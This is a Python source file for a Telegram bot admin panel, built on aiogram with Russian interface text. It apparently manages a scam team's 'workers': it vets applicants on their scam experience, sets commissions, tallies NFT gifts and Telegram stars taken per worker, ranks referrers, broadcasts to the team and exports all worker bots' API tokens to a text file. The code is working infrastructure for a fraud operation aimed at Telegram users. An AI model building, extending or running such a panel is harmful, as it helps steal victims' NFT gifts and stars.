import asyncio
import os
import shutil
import tempfile
from asyncio import create_task

from aiogram import F, Router, types
from aiogram.exceptions import TelegramBadRequest
from sqlalchemy import not_
from sqlalchemy.orm import selectinload
from aiogram.filters.command import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup
from sqlalchemy import func, select

from config import PANEL_OWNERS
from db import Session
from models import Admin, Application, GlobalStats, NFTGift, WorkerBot

admin_router = Router()

class ChangeCommissionState(StatesGroup):
    waiting_for_worker_id = State()
    waiting_for_new_commission = State()
    waiting_for_global_commission = State()

class BroadcastState(StatesGroup):
    waiting_for_text = State()
    waiting_for_photo_decision = State()
    waiting_for_photo = State()

class TransferWorkerStatsState(StatesGroup):
    waiting_for_from_user = State()
    waiting_for_to_user = State()

class SendMsgToWorkerState(StatesGroup):
    waiting_for_worker_id = State()
    waiting_for_message = State()

class SearchWorkerState(StatesGroup):
    waiting_for_worker_ident = State()

class ChangeWorkerStatusState(StatesGroup):
    waiting_for_worker_ident = State()
    waiting_for_new_status = State()

class AddNFTLinksState(StatesGroup):
    waiting_for_links = State()

TOP_REFERRALS_PER_PAGE = 10

# 🔁 Общая функция отправки заявки
async def send_application_message(bot, admin_id: int, app: Application):
    text = (
        f"<b>📥 Заявка #{app.id}</b>\n\n"
        f"<b>👤 ID:</b> <code>{app.telegram_id}</code>\n"
        f"<b>👤 Тег:</b> @{app.username or 'нет'}\n"
        f"<b>👤 Имя:</b> {app.first_name or 'неизвестно'}\n"
        f"<b>1️⃣ Откуда узнал:</b> {app.project_source}\n"
        f"<b>2️⃣ Опыт:</b> {app.scam_experience}\n"
        f"<b>3️⃣ Время на проект:</b> {app.work_time}\n"
        f"<b>4️⃣ Цели:</b> {app.goals}"
    )
    markup = InlineKeyboardMarkup(inline_keyboard=[[ 
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_app:{app.id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_app:{app.id}")
    ]])
    try:
        await bot.send_message(admin_id, text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] Не удалось отправить заявку админу {admin_id}: {e}")

@admin_router.message(Command("admin"), F.chat.type == "private")
async def handle_admin_command(message: types.Message):
    if message.from_user.id not in PANEL_OWNERS:
        await message.answer("Вход 10000 TON")
        return

    async with Session() as session:
        total_admins = (await session.execute(
            select(func.count()).select_from(Admin)
        )).scalar()

        pending = (await session.execute(
            select(func.count()).select_from(Application).where(Application.status == "pending"))
        ).scalar()
        total_bots = (await session.execute(
            select(func.count()).select_from(WorkerBot))
        ).scalar()
        accepted = (await session.execute(
            select(func.count()).select_from(Application).where(Application.status == "accepted"))
        ).scalar()

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Заявки", callback_data="show_pending_apps"),
            InlineKeyboardButton(text="Воркеры", callback_data="show_workers"),
        ],
        [
            InlineKeyboardButton(text="Боты", callback_data="show_worker_bots"),
            InlineKeyboardButton(text="Рассылка", callback_data="broadcast_to_workers"),
        ],
        [
            InlineKeyboardButton(text="Комиссия воркера", callback_data="change_worker_commission"),
            InlineKeyboardButton(text="Комиссия общая", callback_data="change_global_commission"),
        ],
        [
            InlineKeyboardButton(text="Перенести стату", callback_data="transfer_worker_stats"),
            InlineKeyboardButton(text="Статус воркера", callback_data="change_worker_status"),
        ],
        [
            InlineKeyboardButton(text="Поиск воркера", callback_data="search_worker"),
            InlineKeyboardButton(text="Топ рефералы", callback_data="show_top_referrals"),
        ],
        [
            InlineKeyboardButton(text="NFT ссылки", callback_data="add_nft_links"),
            InlineKeyboardButton(text="Сброс статы", callback_data="reset_daily_stats"),
        ],
        [
            InlineKeyboardButton(text="Сообщение воркеру", callback_data="send_message_to_worker"),
            InlineKeyboardButton(text="Скачать txt бот", callback_data="say_txt_bot"),
        ]
    ])

    await message.answer(
        f"<b>🛠 Панель</b>\n"
        f"<b>👥 Всего воркеров:</b> <b>{total_admins}</b>\n"
        f"<b>🤖 Всего ботов:</b> <b>{total_bots}</b>\n"
        f"<b>✅ Принято заявок:</b> <b>{accepted}</b>\n"
        f"<b>⌛️ В ожидании:</b> <b>{pending}</b>",
        parse_mode="HTML",
        reply_markup=markup
    )

@admin_router.callback_query(F.data == "show_pending_apps")
async def show_pending_apps(callback: CallbackQuery):
    async with Session() as session:
        result = await session.execute(select(Application).where(Application.status == "pending"))
        apps = result.scalars().all()

    if not apps:
        await callback.answer("⏳ Нет заявок в ожидании", show_alert=True)
        return

    for app in apps:
        await send_application_message(callback.bot, callback.from_user.id, app)

    await callback.answer("📨 Заявки отправлены")

@admin_router.callback_query(F.data.startswith("accept_app:"))
async def accept_application(callback: CallbackQuery):
    app_id = int(callback.data.split(":")[1])
    delivered = True

    async with Session() as session:
        app = await session.get(Application, app_id)
        if not app:
            await callback.answer("❌ Заявка не найдена", show_alert=True)
            return
        if app.status != "pending":
            await callback.answer("⏳ Заявка уже обработана другим админом", show_alert=True)
            await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[
                    InlineKeyboardButton(
                        text="✅ Одобрено" if app.status == "accepted" else "❌ Отказ",
                        callback_data="ignore"
                    )
                ]]
            ))
            return

        app.status = "accepted"
        admin = (await session.execute(select(Admin).where(Admin.telegram_id == app.telegram_id))).scalar_one_or_none()
        if admin:
            admin.is_accepted = True
        await session.commit()

    await callback.answer("✅ Принято")
    await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text="✅ Одобрено", callback_data="ignore")
        ]]
    ))

    markup = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💬 Вступить в чатик", url="https://t.me/+3YcI4tc_qhE2N2My")
    ]])
    async def send_accept_message():
        nonlocal delivered
        try:
            await callback.bot.send_message(
                app.telegram_id,
                "<b>✅ Заявка одобрена!\n\nТеперь пропишите команду /start для начала работы.</b>",
                parse_mode="HTML",
                reply_markup=markup
            )
        except TelegramBadRequest as e:
            print(f"[ERROR] Пользователь заблокировал бота: {e}")
            delivered = False
        except Exception as e:
            print(f"[ERROR] Ошибка отправки: {e}")
            delivered = False

    asyncio.create_task(send_accept_message())

@admin_router.callback_query(F.data.startswith("reject_app:"))
async def reject_application(callback: CallbackQuery):
    app_id = int(callback.data.split(":")[1])

    async with Session() as session:
        app = await session.get(Application, app_id)
        if not app:
            await callback.answer("❌ Заявка не найдена", show_alert=True)
            return
        if app.status != "pending":
            await callback.answer("⏳ Заявка уже обработана другим админом", show_alert=True)
            await callback.message.edit_text(
                callback.message.text + "\n\n❌ Уже отклонена." if app.status == "rejected" else "\n\n✅ Уже одобрена."
            )
            return

        app.status = "rejected"
        await session.commit()

    await callback.answer("❌ Отклонено")

    try:
        await callback.message.edit_text(callback.message.text + "\n\n❌ Заявка отклонена.")
    except Exception as e:
        print(f"[ERROR] Не удалось изменить сообщение заявки: {e}")

    async def send_reject_message():
        try:
            await callback.bot.send_message(
                app.telegram_id,
                "<b>❌ Ваша заявка была отклонена.</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"[ERROR] Не удалось отправить сообщение пользователю: {e}")

    asyncio.create_task(send_reject_message())

@admin_router.callback_query(F.data == "change_worker_commission")
async def ask_worker_id(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>🧑‍💼 Введите Telegram ID воркера, которому нужно изменить комиссию:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_worker_id)
    await callback.answer()

@admin_router.message(ChangeCommissionState.waiting_for_worker_id)
async def receive_worker_id(message: types.Message, state: FSMContext):
    try:
        worker_id = int(message.text.strip())
    except ValueError:
        await message.answer("<b>❌ Введите корректный числовой Telegram ID.</b>", parse_mode="HTML")
        return

    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == worker_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin:
            await message.answer("<b>❌ Воркер с таким Telegram ID не найден.</b>", parse_mode="HTML")
            return

    await state.update_data(worker_id=worker_id)
    await message.answer(
        f"<b>🔢 Текущая комиссия воркера <code>{worker_id}</code>: {admin.commission_every}\n\n"
        f"✏️ Введите новое значение комиссии (целое число, например 4):</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_new_commission)

@admin_router.message(ChangeCommissionState.waiting_for_new_commission)
async def receive_new_commission(message: types.Message, state: FSMContext):
    try:
        new_value = int(message.text.strip())
        if new_value <= 0:
            raise ValueError
    except ValueError:
        await message.answer("<b>❌ Введите положительное целое число.</b>", parse_mode="HTML")
        return

    data = await state.get_data()
    worker_id = data.get("worker_id")

    async with Session() as session:
        stmt = select(Admin).where(Admin.telegram_id == worker_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin:
            await message.answer("<b>❌ Воркер не найден.</b>", parse_mode="HTML")
            await state.clear()
            return

        admin.commission_every = new_value
        admin.commission_counter = 0  
        await session.commit()

    await message.answer(
        f"<b>✅ Комиссия для воркера <code>{worker_id}</code> обновлена на {new_value}, счётчик сброшен.</b>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "change_global_commission")
async def ask_global_commission(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>🛠 Введите новое значение общей комиссии для всех воркеров:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeCommissionState.waiting_for_global_commission)
    await callback.answer()

@admin_router.message(ChangeCommissionState.waiting_for_global_commission)
async def receive_global_commission(message: types.Message, state: FSMContext):
    try:
        new_value = int(message.text.strip())
        if new_value <= 0:
            raise ValueError
    except ValueError:
        await message.answer("<b>❌ Введите положительное целое число.</b>", parse_mode="HTML")
        return

    async with Session() as session:
        result = await session.execute(select(Admin))
        all_admins = result.scalars().all()

        for admin in all_admins:
            admin.commission_every = new_value
            admin.commission_counter = 0  

        await session.commit()

    await message.answer(
        f"<b>✅ Общая комиссия обновлена на {new_value} и счётчики сброшены у всех воркеров.</b>",
        parse_mode="HTML"
    )
    await state.clear()

    
@admin_router.callback_query(F.data == "reset_daily_stats")
async def reset_daily_statistics(callback: CallbackQuery):
    async with Session() as session:
        result = await session.execute(select(Admin))
        admins = result.scalars().all()

        for admin in admins:
            admin.daily_gifts_unique = 0
            admin.daily_stars_sent = 0

        global_stats = await session.get(GlobalStats, 1)
        if global_stats:
            global_stats.daily_gifts_unique = 0
            global_stats.daily_stars_sent = 0

        await session.commit()

    await callback.answer("✅ Статистика за день сброшена", show_alert=True)

@admin_router.callback_query(F.data == "broadcast_to_workers")
async def broadcast_to_workers(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("<b>✉️ Введите текст рассылки:</b>", parse_mode="HTML")
    await state.set_state(BroadcastState.waiting_for_text)
    await callback.answer()

@admin_router.message(BroadcastState.waiting_for_text)
async def process_broadcast_text(message: types.Message, state: FSMContext):
    await state.update_data(text=message.html_text)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Да", callback_data="add_photo"),
            InlineKeyboardButton(text="Нет", callback_data="no_photo")
        ]
    ])

    await message.answer(
        "<b>Добавить фото к рассылке?</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )
    await state.set_state(BroadcastState.waiting_for_photo_decision)

@admin_router.callback_query(F.data == "add_photo")
async def ask_for_photo(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("<b>📤 Пришли фото для рассылки:</b>", parse_mode="HTML")
    await state.set_state(BroadcastState.waiting_for_photo)
    await callback.answer()

@admin_router.callback_query(F.data == "no_photo")
async def no_photo_broadcast(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    text = data.get("text")
    await state.clear()

    await callback.message.answer("<b>🚀 Рассылка запущена...</b>", parse_mode="HTML")
    create_task(run_broadcast(callback.bot, text, None, callback.from_user.id))
    await callback.answer()

@admin_router.message(BroadcastState.waiting_for_photo, F.photo)
async def handle_photo(message: types.Message, state: FSMContext):
    data = await state.get_data()
    text = data.get("text")
    photo_id = message.photo[-1].file_id  
    await state.clear()

    await message.answer("<b>🚀 Рассылка с фото запущена...</b>", parse_mode="HTML")
    create_task(run_broadcast(message.bot, text, photo_id, message.chat.id))

@admin_router.message(BroadcastState.waiting_for_text)
async def process_broadcast_text(message: types.Message, state: FSMContext):
    text = message.html_text
    await state.clear()
    await message.answer("<b>🚀 Рассылка запущена...</b>", parse_mode="HTML")

    create_task(run_broadcast(message.bot, text, message.chat.id))

async def run_broadcast(bot, text: str, photo_id: str | None, admin_chat_id: int):
    success, failed, total = 0, 0, 0

    async with Session() as session:
        result = await session.execute(
            select(Admin).where(Admin.telegram_id.not_in(PANEL_OWNERS))
        )
        admins = result.scalars().all()

    for admin in admins:
        total += 1
        try:
            if photo_id:
                await bot.send_photo(chat_id=admin.telegram_id, photo=photo_id, caption=text, parse_mode="HTML")
            else:
                await bot.send_message(chat_id=admin.telegram_id, text=text, parse_mode="HTML")
            success += 1
        except Exception as e:
            print(f"[ERROR] {admin.telegram_id} — {e}")
            failed += 1
        await asyncio.sleep(0.07)

    try:
        await bot.send_message(
            chat_id=admin_chat_id,
            text=(
                f"<b>📊 Результаты рассылки:</b>\n\n"
                f"<b>💁🏻‍♀️ Всего:</b> <code>{total}</code>\n"
                f"<b>✅ Успешно:</b> <code>{success}</code>\n"
                f"<b>❌ Ошибок:</b> <code>{failed}</code>"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] Не удалось отправить отчёт: {e}")

@admin_router.callback_query(F.data.startswith("show_workers"))
async def show_workers(callback: CallbackQuery):
    page = int(callback.data.split(":")[1]) if ":" in callback.data else 1
    per_page = 10

    async with Session() as session:
        result = await session.execute(select(Admin))  
        admins = result.scalars().all()

    admins.sort(key=lambda a: a.gifts_unique_sent or 0, reverse=True)

    total = len(admins)
    total_pages = (total + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    end = start + per_page
    admins_page = admins[start:end]

    rows = []
    for i, a in enumerate(admins_page, start=start + 1):
        rows.append(
            f"Воркер #{i}\n"
            f"🆔 {a.telegram_id}\n"
            f"🔹 Тэг: @{a.username or 'нет'}\n"
            f"📛 Имя: {a.first_name or '-'} {a.last_name or ''}\n"
            f"💬 Никнейм: {a.nickname or '-'}\n"
            f"💸 Комиссия: {a.commission_every} | Счётчик: {a.commission_counter}\n"
            f"🎁 NFT: {a.gifts_unique_sent}\n"
            f"🌟 Звёзд: {a.stars_sent}\n"
            f"📊 Сегодня — 🎁 {a.daily_gifts_unique}, 🌟 {a.daily_stars_sent}\n"
        )

    text = "\n".join(rows) if rows else "Воркеры не найдены."

    nav = [
        InlineKeyboardButton(text="⬅️", callback_data=f"show_workers:{page-1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="ignore"),
        InlineKeyboardButton(text="➡️", callback_data=f"show_workers:{page+1}" if page < total_pages else "ignore"),
    ]

    markup = InlineKeyboardMarkup(inline_keyboard=[nav])

    await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()


@admin_router.callback_query(F.data.startswith("show_worker_bots"))
async def show_worker_bots(callback: CallbackQuery):
    page = int(callback.data.split(":")[1]) if ":" in callback.data else 1
    per_page = 7

    async with Session() as session:
        result = await session.execute(
            select(WorkerBot)
            .options(selectinload(WorkerBot.owner))
            .order_by(WorkerBot.owner_id, WorkerBot.id)
        )
        bots = result.scalars().all()

    # Группируем по owner_id
    grouped = {}
    for bot in bots:
        grouped.setdefault(bot.owner_id, []).append(bot)

    grouped_items = list(grouped.items())
    total = len(grouped_items)
    total_pages = (total + per_page - 1) // per_page
    page = max(1, min(page, total_pages))
    start = (page - 1) * per_page
    end = start + per_page
    current_page_items = grouped_items[start:end]

    rows = []
    for i, (owner_id, bots) in enumerate(current_page_items, start=start + 1):
        owner = bots[0].owner
        header = (
            f"<b>👤 Владелец #{i}</b>\n"
            f"🆔 ID: {owner.telegram_id if owner else '-'}\n"
            f"👤 Тэг: @{owner.username if owner and owner.username else 'нет'}\n"
            f"🤖 Боты:\n"
        )
        bots_list = "\n".join([f"    • @{bot.username}" for bot in bots])
        rows.append(f"{header}{bots_list}\n")

    text = "\n".join(rows) if rows else "Нет воркер-ботов."

    nav = [
        InlineKeyboardButton(text="⬅️", callback_data=f"show_worker_bots:{page-1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="ignore"),
        InlineKeyboardButton(text="➡️", callback_data=f"show_worker_bots:{page+1}" if page < total_pages else "ignore")
    ]

    markup = InlineKeyboardMarkup(inline_keyboard=[nav])

    await callback.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    await callback.answer()

@admin_router.callback_query(F.data == "transfer_worker_stats")
async def ask_from_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>Укажи Telegram ID или юзернейм воркера, <u>откуда</u> переносим стату:</b>",
        parse_mode="HTML"
    )
    await state.set_state(TransferWorkerStatsState.waiting_for_from_user)
    await callback.answer()

@admin_router.message(TransferWorkerStatsState.waiting_for_from_user)
async def receive_from_user(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin_from = (await session.execute(query)).scalar_one_or_none()

    if not admin_from:
        await message.answer("<b>❌ Воркер не найден. Введи правильный Telegram ID или username.</b>", parse_mode="HTML")
        return

    await state.update_data(from_user_id=admin_from.telegram_id)
    await message.answer(
        "<b>Введи Telegram ID или юзернейм воркера, <u>КУДА</u> перенести стату:</b>",
        parse_mode="HTML"
    )
    await state.set_state(TransferWorkerStatsState.waiting_for_to_user)

@admin_router.message(TransferWorkerStatsState.waiting_for_to_user)
async def receive_to_user(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    data = await state.get_data()
    from_user_id = data.get("from_user_id")

    async with Session() as session:
        admin_from = (await session.execute(select(Admin).where(Admin.telegram_id == from_user_id))).scalar_one_or_none()
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin_to = (await session.execute(query)).scalar_one_or_none()

        if not admin_to:
            await message.answer("<b>❌ Куда переносить — воркер не найден.</b>", parse_mode="HTML")
            return
        if admin_to.telegram_id == admin_from.telegram_id:
            await message.answer("<b>❗️ Переносить самому себе нельзя.</b>", parse_mode="HTML")
            return

        gifts = admin_from.gifts_unique_sent
        stars = admin_from.stars_sent
        admin_to.gifts_unique_sent += gifts
        admin_to.stars_sent += stars
        await session.commit()

    await message.answer(
        f"<b>✅ Стата воркера успешно перенесена.</b>\n"
        f"<b>С:</b> <code>{admin_from.telegram_id}</code> → <b>На:</b> <code>{admin_to.telegram_id}</code>\n"
        f"<b>🎁 NFT:</b> <code>{gifts}</code>\n"
        f"<b>🌟 Звёзд:</b> <code>{stars}</code>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "send_message_to_worker")
async def ask_worker_id(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>Введи Telegram ID или username воркера:</b>",
        parse_mode="HTML"
    )
    await state.set_state(SendMsgToWorkerState.waiting_for_worker_id)
    await callback.answer()

@admin_router.message(SendMsgToWorkerState.waiting_for_worker_id)
async def receive_worker_id(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')

    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        worker = (await session.execute(query)).scalar_one_or_none()

    if not worker:
        await message.answer("<b>❌ Воркер не найден.</b>", parse_mode="HTML")
        return

    await state.update_data(worker_id=worker.telegram_id)
    await message.answer("<b>Введи текст для отправки воркеру:</b>", parse_mode="HTML")
    await state.set_state(SendMsgToWorkerState.waiting_for_message)

@admin_router.message(SendMsgToWorkerState.waiting_for_message)
async def send_message_to_worker(message: types.Message, state: FSMContext):
    data = await state.get_data()
    worker_id = data.get("worker_id")
    payload = {}

    # Текст
    if message.text or message.html_text:
        payload = {"type": "text", "data": message.html_text or message.text}
    # Стикер
    elif message.sticker:
        payload = {"type": "sticker", "data": message.sticker.file_id}
    # Гифка (animation)
    elif message.animation:
        payload = {"type": "animation", "data": message.animation.file_id}
    else:
        await message.answer("<b>❌ Можно отправлять только текст, стикер или гифку!</b>", parse_mode="HTML")
        return

    await message.answer("<b>✅ Сообщение отправлено воркеру</b>", parse_mode="HTML")
    asyncio.create_task(_send_message_to_worker_bg(
        message.bot, worker_id, payload, message.chat.id
    ))
    await state.clear()

async def _send_message_to_worker_bg(bot, worker_id, payload, admin_id):
    try:
        if payload["type"] == "text":
            await bot.send_message(
                chat_id=worker_id,
                text=payload["data"],
                parse_mode="HTML"
            )
        elif payload["type"] == "sticker":
            await bot.send_sticker(
                chat_id=worker_id,
                sticker=payload["data"]
            )
        elif payload["type"] == "animation":
            await bot.send_animation(
                chat_id=worker_id,
                animation=payload["data"]
            )
    except Exception as e:
        print(f"[ERROR] Не удалось отправить сообщение воркеру {worker_id}: {e}")
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"<b>❌ Не удалось отправить сообщение воркеру <code>{worker_id}</code>:</b>\n<code>{e}</code>",
                parse_mode="HTML"
            )
        except Exception as e2:
            print(f"[ERROR] Не удалось уведомить админа о проблеме: {e2}")

@admin_router.callback_query(F.data == "search_worker")
async def ask_worker_ident(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>Введи Telegram ID или username воркера для поиска:</b>",
        parse_mode="HTML"
    )
    await state.set_state(SearchWorkerState.waiting_for_worker_ident)
    await callback.answer()

@admin_router.message(SearchWorkerState.waiting_for_worker_ident)
async def process_search_worker(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')

    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        worker = (await session.execute(query)).scalar_one_or_none()

        bots_text = ""
        if worker:
            bots = (await session.execute(
                select(WorkerBot).where(WorkerBot.owner_id == worker.id)
            )).scalars().all()
            if bots:
                bots_list = "\n".join([f"• @{b.username or '-'}" for b in bots])
                bots_text = f"\n<b>🤖 Боты воркера:</b>\n{bots_list}"
            else:
                bots_text = "\n<b>🤖 Боты воркера:</b>\n- Нет ботов"

            # собираем рефералов и их статистику
            referrals = (await session.execute(
                select(Admin).where(Admin.referred_by == worker.telegram_id)
            )).scalars().all()
            total_nft = sum(getattr(r, "gifts_unique_sent", 0) or 0 for r in referrals)
            total_stars = sum(getattr(r, "stars_sent", 0) or 0 for r in referrals)
            total_referrals = len(referrals)

    if not worker:
        await message.answer("<b>❌ Воркер не найден.</b>", parse_mode="HTML")
    else:
        text = (
            f"<b>🆔</b> <code>{worker.telegram_id}</code>\n"
            f"<b>🔹 Тэг: @{worker.username or 'нет'}</b>\n"
            f"<b>📛 Имя: {worker.first_name or '-'}</b> <b>{worker.last_name or ''}</b>\n"
            f"<b>💬 Никнейм: {worker.nickname or '-'}</b>\n"
            f"<b>💸 Комиссия: {worker.commission_every}</b> | <b>Счётчик: {worker.commission_counter}</b>\n\n"
            f"<b>📈 Общая стата:</b>\n"
            f"<b>🎁 NFT: {worker.gifts_unique_sent}</b>\n"
            f"<b>🌟 Звёзд: {worker.stars_sent}</b>\n\n"
            f"<b>📊 За сегодня:</b>\n"
            f"<b>🎁 NFT: {worker.daily_gifts_unique}</b>\n"
            f"<b>🌟 Звёзд: {worker.daily_stars_sent}</b>\n\n"
            f"<b>👥 Рефералов:</b> <code>{total_referrals}</code>\n"
            f"<b>🎆 NFT от рефералов:</b> <code>{total_nft}</code> | <b>⭐️ Звёзд от рефералов:</b> <code>{total_stars}</code>\n"
            f"{bots_text}"
        )
        await message.answer(text, parse_mode="HTML")

    await state.clear()

@admin_router.callback_query(F.data.startswith("show_top_referrals"))
async def show_top_referrals(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    page = int(parts[1]) if len(parts) > 1 else 1
    page = max(1, page)

    async with Session() as session:
        subq = (
            select(
                Admin.referred_by,
                func.count(Admin.id).label("referrals_count"),
                func.sum(Admin.gifts_unique_sent).label("total_nft"),
                func.sum(Admin.stars_sent).label("total_stars")
            )
            .where(Admin.referred_by.isnot(None))
            .group_by(Admin.referred_by)
            .subquery()
        )

        total_records = await session.scalar(select(func.count()).select_from(subq))
        pages = (total_records + TOP_REFERRALS_PER_PAGE - 1) // TOP_REFERRALS_PER_PAGE or 1
        page = min(page, pages)
        offset = (page - 1) * TOP_REFERRALS_PER_PAGE

        result = await session.execute(
            select(Admin, subq.c.referrals_count, subq.c.total_nft, subq.c.total_stars)
            .join(subq, Admin.telegram_id == subq.c.referred_by)
            .order_by((subq.c.total_nft + subq.c.total_stars).desc())
            .offset(offset)
            .limit(TOP_REFERRALS_PER_PAGE)
        )

        rows = []
        for idx, (admin, referrals_count, total_nft, total_stars) in enumerate(result.all(), start=offset + 1):
            line = f"#{idx} {admin.telegram_id}"
            if admin.username:
                line += f" | @{admin.username}"
            line += (
                f"\nРефералов: {referrals_count}"
                f"\nNFT: {total_nft or 0} | Звёзд: {total_stars or 0}\n"
                + "-" * 30
            )
            rows.append(line)

        if not rows:
            text = "Топ рефералов пуст."
        else:
            text = "🔥 Топ рефералов по количеству переводов (NFT и звёзды):\n\n" + "\n".join(rows)

    nav = [
        InlineKeyboardButton(text="⬅️", callback_data=f"show_top_referrals:{page-1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{pages}", callback_data="ignore"),
        InlineKeyboardButton(text="➡️", callback_data=f"show_top_referrals:{page+1}" if page < pages else "ignore"),
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=[nav])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@admin_router.callback_query(F.data == "change_worker_status")
async def ask_worker_ident(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>Введите Telegram ID или username воркера, которому хочешь изменить статус:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeWorkerStatusState.waiting_for_worker_ident)
    await callback.answer()

@admin_router.message(ChangeWorkerStatusState.waiting_for_worker_ident)
async def ask_new_status(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin = (await session.execute(query)).scalar_one_or_none()

    if not admin:
        await message.answer("<b>❌ Воркер не найден.</b>", parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(worker_id=admin.id)

    await message.answer(
        f"<b>Текущий статус воркера: <u>{admin.status or 'Воркер'}</u></b>\n\n"
        f"<b>Введи новый статус для воркера:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeWorkerStatusState.waiting_for_new_status)

@admin_router.message(ChangeWorkerStatusState.waiting_for_new_status)
async def set_new_status(message: types.Message, state: FSMContext):
    new_status = message.text.strip()
    data = await state.get_data()
    worker_id = data.get("worker_id")

    async with Session() as session:
        admin = await session.get(Admin, worker_id)
        if not admin:
            await message.answer("<b>❌ Воркер не найден.</b>", parse_mode="HTML")
            await state.clear()
            return

        admin.status = new_status
        await session.commit()

    await message.answer(
        f"<b>✅ Статус изменён:</b> <b>{new_status}</b>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "add_nft_links")
async def ask_nft_links(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>Пришли новые NFT-ссылки через запятую или с новой строки (старые будут заменены!):</b>",
        parse_mode="HTML"
    )
    await state.set_state(AddNFTLinksState.waiting_for_links)
    await callback.answer()

@admin_router.message(AddNFTLinksState.waiting_for_links)
async def handle_nft_links(message: types.Message, state: FSMContext):
    raw = message.text.replace(",", "\n")
    links = [line.strip() for line in raw.splitlines() if line.strip()]
    links = [l for l in links if l.startswith("http")]

    if not links:
        await message.answer("<b>❌ Нет валидных ссылок. Попробуй снова.</b>", parse_mode="HTML")
        return

    from sqlalchemy import delete
    async with Session() as session:
        await session.execute(delete(NFTGift))   
        await session.commit()
        for url in links:
            session.add(NFTGift(url=url))
        await session.commit()

    await message.answer(
        f"<b>✅ Ссылки обновлены! Всего: {len(links)}</b>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "say_txt_bot")
async def say_txt_bot(callback: CallbackQuery):
    async with Session() as session:
        result = await session.execute(select(WorkerBot))
        bots = result.scalars().all()

    if not bots:
        await callback.answer("🤖 Боты не найдены", show_alert=True)
        return

    lines = []
    for bot in bots:
        username = f"@{bot.username}" if bot.username else f"id:{bot.telegram_id}"
        lines.append(f"{username} | {bot.token}")

    text_data = "\n".join(lines)

    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as f:
        f.write(text_data)
        temp_path = f.name

    file = FSInputFile(temp_path, filename="bots_list.txt")
    await callback.message.answer_document(file, caption="🤖 Список ботов")
    await callback.answer()